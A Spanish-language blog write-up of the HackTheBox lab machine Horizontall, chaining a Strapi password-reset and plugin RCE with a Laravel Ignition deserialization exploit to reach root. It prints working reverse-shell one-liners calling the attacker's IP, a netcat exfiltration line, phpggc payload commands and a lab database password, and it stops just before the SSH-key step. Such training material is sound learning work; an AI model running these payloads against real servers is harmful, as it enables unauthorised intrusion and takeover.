---
layout      : post
title       : "HackTheBox - Horizontall"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374banner.png
category    : [ htb ]
tags        : [ deserialization, Laravel 8, Ignition PHP, Strapi, SSH-Keys ]
---
Máquina Linux nivel fácil. Inspección de código fuente, problemitas con `Strapi`, con `Laravel` y con reverse shells.

![374horizontallHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374horizontallHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [wail99](https://www.hackthebox.eu/profile/4005).

Pequeños detalles.

Encontraremos un servidor web, investigando las fuentes relacionadas encontraremos un subdominio que nos llevara al servicio `Strapi`. Buscando vulnerabilidades llegaremos a una que resetea la contraseña del usuario admin y mediante un plugin mal sanitizado obtenemos **RCE**, lo usaremos para entablarnos una reverse shell como `strapi`.

Estando dentro encontraremos un servicio corriendo internamente en el puerto `8000`, jugaremos con un **port-fortwarding** para estar cómodos.

El servicio corre `Laravel 8`, jugando de nuevo a buscar vulnerabilidades llegaremos a una deserialización insegura enfocada en **PHP** e `Ignition` (extensión de **PHP** para ver los errores de una forma "linda"), apoyados en la vuln lograremos una Reverse Shell inestable como el usuario `root`, jugaremos con llaves `SSH` para agregar nuestra public key y obtener una Shell como `root` sin necesidad de contraseña.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Vulnerabilidades conocidas, pero la ruta llevada por la máquina no es tan real.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudar**nos** ¿por que no hacerlo? ... Un detalle: si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

¡Todo lo que ves es vida!

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Recorriendo el servidor web del puerto 80](#puerto-80).
  * [Encontramos subdominio leyendo código y fuzzeando](#web-found-subdomain).
3. [Explotación](#explotacion).
  * [Rompiendo **Strapi**](#exploit-strapi).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Jugando con **Laravel** y su **versión 8**](#laravel8).
  * [Generamos **port-fortwarding** para explorar los servicios **Laravel** e **Ignition**](#fortwarding-laravel).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Lo primero que necesitamos conocer de la máquina son los puntos de acceso con los que podemos interactuar, en este caso los puertos que tenga abiertos (cada puerto mantiene un servicio, ese servicio es el que nos interesa descubrir), usaremos la herramienta `nmap` para ello:

```bash
❱ nmap -p- --open -v 10.10.11.105 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Como resultado obtenemos:

```bash
❱ cat initScan 
# Nmap 7.80 scan initiated Fri Oct  1 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.11.105
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.105 ()   Status: Up
Host: 10.10.11.105 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Fri Oct  1 25:25:25 2021 -- 1 IP address (1 host up) scanned in 82.66 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Este servicio nos permite obtener una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Contamos con un servidor web. |

Ahora que tenemos los puertos activos y con los que podemos interactuar, profundicemos y tratemos de ver que versiones y scripts (son programas pequeños que usa `nmap` para enumerar cositas) nos devuelven información con cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, en este caso solo tenemos 2 puertos con lo que no es de mucha utilidad usarla, pero igual esta muy buena**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.105
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.11.105 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Fri Oct  1 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  1 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.45 seconds
```

Bien, veamos que hay por ahí:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 |
| 80     | HTTP     | nginx 1.14.0 |

* Vemos que intenta hacer un [redirect](https://www.rdstation.com/co/blog/redirect-301/) hacia el dominio `horizontall.htb`, ya veremos esto.

Nada más por aquí, pues empecemos a explorar y explotar de una vez por todas!

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Recorriendo el servidor web del puerto 80 [📌](#puerto-80) {#puerto-80}

Como ya vimos en el escaneo de `nmap`, el servicio web intenta redirigir el tráfico al dominio `horizontall.htb`, por lo que si visitamos la página web colocando la dirección IP de la máquina nos debe devolver error y mostrarnos el intento de ir hacia el dominio ya citado, veamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_error_redirect2horizontallHTB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, vemos que intenta ir a `horizontall.htb`, pues para solucionar esto es muy sencillo.

Únicamente debemos modificar el archivo [etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html) que es el que se encarga que las resoluciones entre **IPs** y **dominios** sean válidas, así al intentar visitar `horizontall.htb` el sistema entienda que debe responder el [contenido relacionado a ese dominio](https://linube.com/ayuda/articulo/267/que-es-un-virtualhost) con respecto a la dirección **IP**, o sea la `10.10.11.105`, el archivo quedaría así:

```bash
❱ cat /etc/hosts
...
10.10.11.105  horizontall.htb
...
```

Y si ahora volvemos a conectarnos ya sea contra la IP o contra el dominio, veremos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, ahora sí...

La web es bastante linda, pero ningún botón es funcional, así que nos queda intentar descubrir recursos fuera de nuestra vista (fuzzing), intentar descubrir otros dominios, revisar código fuente, ver como viajan las peticiones, quizás se desvele por ahí alguna versión o software externo, en fin, hay varias cositas para jugar.

## Nuevo subdominio leyendo código y fuzzeando [📌](#web-found-subdomain) {#web-found-subdomain}

Fuzzeando directorios nos encontramos nada relevante, viendo como viajan las peticiones tampoco obtenemos nada, peeeeero al intentar encontrar otros dominios encontramos cositas, usaremos `wfuzz`:

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.105 -H 'Host: FUZZ.horizontall.htb'
```

Lo que le estamos diciendo es que no nos muestre los resultados con código de estado `404` (Not Found), que tome la wordlist (lista de subdominios) de la ruta `/opt/...`, intente una consulta contra la dirección IP `10.10.11.105`, pero que en el header de la petición vaya cambiando el host con respecto a cada palabra de la wordlist. Por ejemplo, si prueba con `si`, `claro` y `hola`, pueda que `hola.horizontall.htb` nos dé un resultado distinto a `404`, nos lo reportaría y sabríamos que al generar esa petición el servidor web encontró algo diferente a tooodos los demás intentos, lo cual sería interesante revisar...

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.105 -H 'Host: FUZZ.horizontall.htb'
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000007:   301        7 L      13 W       194 Ch      "webdisk"
000000031:   301        7 L      13 W       194 Ch      "mobile"
000000015:   301        7 L      13 W       194 Ch      "ns"
000000003:   301        7 L      13 W       194 Ch      "ftp"
```

Pero al intentarlo, nos devuelve muchas redirecciones (falsos positivos), quitémonos esto de la respuesta, usemos la columna `Chars` y su valor `194` para evitar que nos muestre resultados con ese numero de caracteres.

```bash
❱ wfuzz -c --hc=404 --hh=194 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.105 -H 'Host: FUZZ.horizontall.htb'
```

La idea es dejar que pruebe con cada palabra del archivo, así que solo nos queda esperar... Mientras tanto verifiquemos el código fuente de la web.

Vamos a la web principal y hacemos `CTRL+U`, vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_sourceCodeHTMLweak.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bastante feo intentar entenderlo, así que apoyémonos de internet para darle un formato lindo al código `HTML`, buscamos **beautifier HTML** y seleccionamos alguno, yo [tome este](https://www.freeformatter.com/html-formatter.html), lo siguiente es copiar y pegar el código `HTML` en el formateador y dar clic en `Format HTML`, veríamos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, mucho mejor...

Vemos varios recursos `.css` y `.js`, después de inspeccionar cada uno, encontramos locuras en un `.js`:

```html
view-source:http://horizontall.htb/js/app.c68eb462.js
<!-- Tomamos el codigo y lo pegamos en (por ejemplo): https://beautifier.io/ -->
```

Leemos y leemos, casi al final tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatJS_found_api-prod_domain.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaaaa, vemos otro dominio, la web supuestamente lo usa para extraer un recurso `/reviews`, pero claro, primero debemos agregar ese dominio a un archivo, ¿no? Exaaacto, al `/etc/hosts`, así lograremos que nos resuelva el contenido relacionado con ese dominio...

```bash
❱ cat /etc/hosts
...
10.10.11.105  horizontall.htb api-prod.horizontall.htb
...
```

Antes de revisar lo que nos responde, recordemos que tenemos activo el descubrimiento de dominios, curiosamente al revisar tenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_wfuzz_found_api-prod_domain.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

También encontramos el subdominio `api-prod`, así que existen dos maneras de obtener el dominio (: Ahora sí, revisemos que resuelve...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmm, se nos ocurre inicialmente fuzzear por directorios, es medio raro una pantalla de bienvenida así no más, pero antes de, si nos fijamos ya sea con `whatweb` (comando) o `wappalyzer` (extensión web) nos reporta algo llamado `Strapi`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_wappalyzer_Strapi.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, antes de caer en falsos positivos, veamos si realmente hay más recursos, pero fuera de nuestra vista, en este caso usaremos `dirsearch.py` (prácticamente es lo mismo que `WFUZZ`, solo para que vean que existen muuuuuchas herramientas):

```bash
❱ dirsearch.py -u http://api-prod.horizontall.htb/
...
[25:25:25] Starting:
[25:25:25] 200 -  854B  - /admin
...
[25:25:25] 403 -   60B  - /users
...
Task Completed
```

Entre tooooooooodos los resultados podemos destacar esos dos recursos: `/admin` y `/users`, revisemos `/admin`:

```html
http://api-prod.horizontall.htb/admin/
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaa, confirmamos lo de `Strapi`, tenemos un login-panel, probando credenciales por default no logramos pasarlo, investiguemos sobre **Strapi**:

🤯 ***[Strapi](https://strapi.io/) es un <u>headless CMS</u>, o lo que traducido al español sería un CMS sin front-end. Es decir, podemos crear cualquier tipo de contenido (post, páginas, podcasts, categorías, libros) <u>que luego lo podemos consumir desde cualquier otra aplicación web a través de la API que nos proporciona</u>.*** 

* [¿Qué es Strapi?](https://www.juanoa.com/desarrollo/creando-rest-api-strapi/)
* [Además les dejo este recurso hablando sobre los **Headless CMS**](https://www.genbeta.com/desarrollo/headless-cms-que-que-se-diferencian-tradicionales).

---

# Explotación [#](#explotacion) {#explotacion}

Después de jugar con las peticiones no llegamos a ningún lado, probemos directamente a buscar vulnerabilidades para **Strapi**...

Encontramos este exploit bastante reciente:

* [Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)](https://www.exploit-db.com/exploits/50239).

Jmmm, leyendo lo que hace, inicialmente válida la versión de **Strapi** y así mismo indica si es vulnerable o no, pues corroborémosla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_StrapiVersion.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, es la que el exploit -explota-, así que lo más probable es que sea por acá :P

Relaciona dos **CVEs**:

* [CVE-2019-18818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818).

  ***Versions of strapi <u>prior</u> to 3.0.0-beta.17.5 are vulnerable to Privilege Escalation. The password reset routes allows an unauthenticated attacker to <u>reset an admin's password without providing a valid password reset token</u>.*** [privesc in Strapi](https://github.com/advisories/GHSA-6xc2-mj39-q599)

* [CVE-2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-19609).

  ***The Strapi framework <u>before</u> 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel, <u>because it does not sanitize the plugin name, and attackers can inject arbitrary shell commands</u> to be executed by the execa function.***

Perfecto, por un lado, reseteamos la contraseña del usuario **administrador**, al resetearla tenemos acceso al panel-admin donde instalamos o desinstalamos un plugin que nos permite inyectar comandos en el sistema, bastante lindo ¿no? Démosle candela...

## Jugando con <u>Strapi</u> y dos vulnerabilidades [📌](#exploit-strapi) {#exploit-strapi}

Descargamos el exploit a nuestra máquina y vemos su uso:

```bash
❱ python3 strapi_betaRCE.py 
[-] Wrong number of arguments provided
[*] Usage: python3 exploit.py <URL>
```

Únicamente debemos pasarle la URL donde esta sirviendo **Strapi**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_VULNERABLE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, es vulnerable y la contraseña del usuario `admin` ha sido cambiada. El exploit nos brinda una fake-shell para indicarle que comandos ejecutar, intentemos ver quien somos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_blindRCE_whoamiFAIL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

No obtenemos el resultado, pero el propio output nos indica el porqué, la explotación es blind, o sea, no nos va a devolver X resultado como output, por lo tanto, para confirmar que si hay **RCE** podemos enviar el resultado del comando `whoami` por medio de `netcat`, esperemos que exista, si no, directamente probamos a generar una reverse shell.

La idea es levantar un servidor en algún puerto, así por ejemplo:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Y desde la fake-shell ejecutar:

```bash
whoami | nc <attacker_ip> 4433
whoami | nc 10.10.14.78 4433
```

Lo que hace es ejecutar el comando `whoami` y el resultado enviarlo al servidor de la IP `10.10.14.78` (mi IP) y el puerto `4433` (mi puerto), si existe el RCE (y si existe `nc` en la máquina), deberíamos obtener el resultado, veamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_whoamiNC_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peeeeerfectísimo, el comando da como resultado al usuario `strapi`, así que existe el **RCE**, generemos una reverse shell (una terminal, algo que nos permita entrar directamente al sistema e interacción completa con él):

Volvemos a ponernos en escucha por un puerto, yo tomare de nuevo el `4433`:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Hay [varias maneras de generar una Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), yo la haré así:

* Pasamos el comando a `base64`, así evitamos que se corrompa la instrucción al ejecutarla:

  ```bash
  ❱ echo "bash -i >& /dev/tcp/10.10.14.78/4433 0>&1" | base64
  YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDMzIDA+JjEK
  ```

* Y ahora simplemente en la fake-shell le decimos que el sistema tome esa cadena en `base64`, la decodee y la interprete, al interpretarla generara la petición contra nuestro servidor enviando una `/bin/bash` (una Shell):

  ```bash
  $> echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDMzIDA+JjEK | base64 -d | bash
  ```

La ejecutamos...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMOOOOOOOOOOOOO, tamos dentrowowowowowoowjsadlkfjñas...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_gif_letsFUCKIN6go.gif" style="display: block; margin-left: auto; margin-right: auto; width: 50%;"/>

Antes de seguir, démosle un formato más lindo a nuestra terminal, pero además de lindo algo que no nos genere problemas a futuro, así podremos ejecutar `CTRL^C` sin problema, tener histórico de los comandos y así mismo movernos entre ellos. Esto se llama hacer un **tratamiento de la TTY**:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

---

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema encontramos un archivo con credenciales:

```json
strapi@horizontall:~$ cat /opt/strapi/myapi/config/environments/development/database.json 
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

Son del usuario `developer` del gestor de base de datos `MySQL`, si las probamos son válidas, pero recorriendo las tablas no encontramos nada interesante, intentando reutilización de credenciales tampoco llegamos a ningún lado, así que sigamos enumerando...

El usuario `developer` de **MySQL** también es un -usuario- del sistema:

```bash
strapi@horizontall:~$ ls /home
developer
```

```bash
strapi@horizontall:~$ cat /etc/passwd | grep -E "sh$"
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
strapi:x:1001:1001::/opt/strapi:/bin/sh
```

Quizás debamos movernos a él, pero bueno, seguimos...

Después de un rato, al listar los servicios activos internamente, vemos un puerto llamativo:

```bash
strapi@horizontall:~$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
...
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
...
```

Tenemos:

* `1337`: Qué es **Strapi**.
* `3306`: Qué es el servicio **MySQL**.
* `8000`: Este es el llamativo, investiguémoslo...

Podemos jugar con `cURL` directamente:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
...
<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos algo que relaciona a `Laravel`, en el título se refleja y al final tenemos dos versiones de software:

* `Laravel v8`
* `PHP v7.4.18`

Esto se empieza a volver interesante, podemos buscar vulnerabilidades relacionadas con esas versiones, quizás sea por acá el camino...

## Jugando con <u>Laravel</u> en su <u>versión 8</u> [📌](#laravel8) {#laravel8}

En internet encontramos estos recursos locochones:

* [Laravel (\<=v8.4.2) exploit attempts for CVE-2021-3129 (debug mode: Remote code execution)](https://isc.sans.edu/forums/diary/Laravel+v842+exploit+attempts+for+CVE20213129+debug+mode+Remote+code+execution/27758/).
* [Laravel \<= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce).

La explotación esta relacionada al **CVE** [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129):

🕹️ ***`Ignition` before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). <u>This is exploitable on sites using debug mode with Laravel before 8.4.2</u>***.

Según [sans.edu](https://isc.sans.edu/forums/diary/Laravel+v842+exploit+attempts+for+CVE20213129+debug+mode+Remote+code+execution/27758/) `Ignition` sirve para mostrar errores de **Laravel** de manera "bonita".

La vulnerabilidad permite tomar ventaja de los `Ignition Solutions`, que sirven para injectar trozos de codigo al estar en un debug.

No profundizaré en la explotación, por el contrario, les vuelvo a compartir uno de los recursos de arriba que explica detalladamente como funciona la vuln:

* [Laravel \<= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce).

Aún no sabemos si lo que tenemos es vulnerable, empecemos a probar cositas...

El anterior recurso (o buscando) nos lleva a este repo con una prueba de concepto (PoC):

* [https://github.com/ambionics/laravel-exploits](https://github.com/ambionics/laravel-exploits)

El repo aprovecha el uso de la librería [phpggc](https://github.com/ambionics/phpggc) de **PHP** que se encarga de generar payloads para explotar deserializaciones inseguras en el propio **PHP**.

📋 ***`Deserialización` es el proceso por el cual pasa un <u>conjunto de bytes</u> que necesitan <u>convertirse en un objeto entendible</u>. Y la serialización sería pasar ese objeto a bytes para almacenarlos en memoria, a bases de datos, o sea, guardarlo en el sistema.***

Entonces, usa esa librería para generar un payload en formato [PHAR](https://blogprog.gonzalolopez.es/articulos/phar.html) con el -gadget- `monolog/rce1` (en el repo de [phpgcc](https://github.com/ambionics/phpggc) están todos los gadgets disponibles por si ese no nos funciona) intentando ejecutar el comando `id` del usuario que esté ejecutando el servicio `Laravel` e `Ignition`.

Para hacer todo de una manera más cómoda, generemos un redireccionamiento de puertos, esto para transformar uno de nuestros puertos en el puerto `8000` de la máquina víctima, así podemos descargar todas las herramientas en nuestra máquina sin tener que estar pasando y migrando cosas.

Podemos utilizar la herramienta [chisel](https://github.com/jpillora/chisel) para esto, vamos a [releases](https://github.com/jpillora/chisel/releases) y descargamos una versión, yo bajare `chisel_1.7.6_linux_amd64.gz`. Una vez descargado, lo descomprimimos (`gzip -d <archivo>`) y por comodidad le cambiamos el nombre a `chisel`. Lo subimos a la máquina víctima:

```bash
# Creamos area de trabajo
strapi@horizontall:~$ mkdir /tmp/test
strapi@horizontall:~$ cd !$
cd /tmp/test
strapi@horizontall:/tmp/test$
```

Jugamos con `nc` para transferir el archivo:

```bash
❱ nc -lvp 4435 < chisel 
listening on [any] 4435 ...
```

Y en la máquina víctima le decimos que se conecte al servidor levantado, espere 5 segundos por si algo y el resultado lo guarde con el nombre de `chisel`:

```bash
strapi@horizontall:/tmp/test$ nc -w 5 10.10.14.78 4435 > chisel
```

Esperamos yyyyyyyyy validamos integridad:

```bash
strapi@horizontall:/tmp/test$ md5sum chisel 
58037ef897ec155a03ea193df4ec618a  chisel
...
❱ md5sum chisel 
58037ef897ec155a03ea193df4ec618a  chisel
```

Perfecto, le damos permisos de ejecución y tamos listos para entablar la locura:

```bash
strapi@horizontall:/tmp/test$ chmod +x chisel
```

## Generamos <u>port-fortwarding</u> [📌](#fortwarding-laravel) {#fortwarding-laravel}

En la máquina de atacante ejecutamos el servidor que estará en escucha por un puerto, en mi caso por el puerto `1111`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_chisel_server.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ahora hacemos que la máquina víctima sea el cliente que se conecte al servidor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_chisel_client.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, lo que le dijimos es que se conecte al puerto `1111` de la dirección `10.10.14.78`, una vez se conecte a ese puerto, tome el contenido del servicio `8000` del localhost (`127.0.0.1`) y transforme nuestro puerto `8001` con el contenido del puerto `8000`, por lo que ahora debemos tener en nuestro puerto `8001` el servicio `Laravel`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page8001localhost_fortwarding_laravel_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfectísimo, ahora sí, intentemos explotar esta vaina...

...

Descargamos `phpgcc`:

```bash
❱ git clone https://github.com/ambionics/phpggc
```

Y el **PoC**:

```bash
❱ git clone https://github.com/ambionics/laravel-exploits
```

```bash
❱ ls
laravel-exploits  phpgcc
```

Generemos el payload para intentar ejecutar el comando `id`:

```bash
❱ php -d'phar.readonly=0' ./phpgcc/phpggc --phar phar -o aca_ta_la_locura.phar --fast-destruct monolog/rce1 system id
```

Guardamos el payload en el archivo `aca_ta_la_locura.phar`, el resultado es este:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_cat_payload_PHAR.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ahora simplemente debemos ejecutar el exploit pasándole la URL donde esta `Laravel` e `Ignition`, junto al `payload`:

```bash
❱ python3 laravel-exploits/laravel-ignition-rce.py http://localhost:8001 aca_ta_la_locura.phar
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_RCE_id_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAAAAAAAA, vemos que los archivos del servicio los guarda el usuario `developer`, peeeeeeeeeero el que esta ejecutando el proceso es el usuario `root` 😵

Pues ya estamos, tenemos **RCE** como el usuario **administrator** del sistema, generemos una reverse shell (:

```bash
❱ nc -lvp 4450
listening on [any] 4450 ...
```

```bash
❱ echo "bash -i >& /dev/tcp/10.10.14.78/4450 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDUwIDA+JjEK
```

```bash
❱ php -d'phar.readonly=0' ./phpgcc/phpggc --phar phar -o aca_ta_la_locura.phar --fast-destruct monolog/rce1 system 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDUwIDA+JjEK | base64 -d | bash'
```

```bash
❱ python3 laravel-exploits/laravel-ignition-rce.py http://localhost:8001 aca_ta_la_locura.phar 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La obtenemos, pero el problema es que la perdemos muy rápido, la conexión que abre el exploit se queda pegada y hace que el fortwarding se interrumpa por lo que lo cierra y perdemos toooooodo :(

Pero no es problema, otra manera de obtener una **Shell** puede ser con ayuda de las llaves `SSH`, existe un archivo en la ruta `/home/<user>/.ssh` llamado `authorized_keys` (si no existe, se crea), este objeto contiene todas las llaves <u>públicas</u> de los usuarios que pueden conectarse como <user> sin proveer contraseña.

Entonces si el usuario `root` en su archivo `authorized_keys` tiene nuestra llave publica, al intentar autenticarnos como `root`, el sistema interpretara que tenemos "permiso" para ingresar como él. Por lo tanto, obtendremos una sesión (: Intentémoslo:

Generamos par de llaves (por si nos las tienes):

```bash
❱ ssh-keygen
```

Se nos generan estos dos objetos:

```bash
❱ ls ~/.ssh/
id_rsa  id_rsa.pub
```

La importante en este caso es la llave pública (`id_rsa.pub`) (esa es la que podemos compartir, la privada **NO SE COMPARTE**, la compartes y valiste).

Copiamos su contenido y ejecutamos el payload:

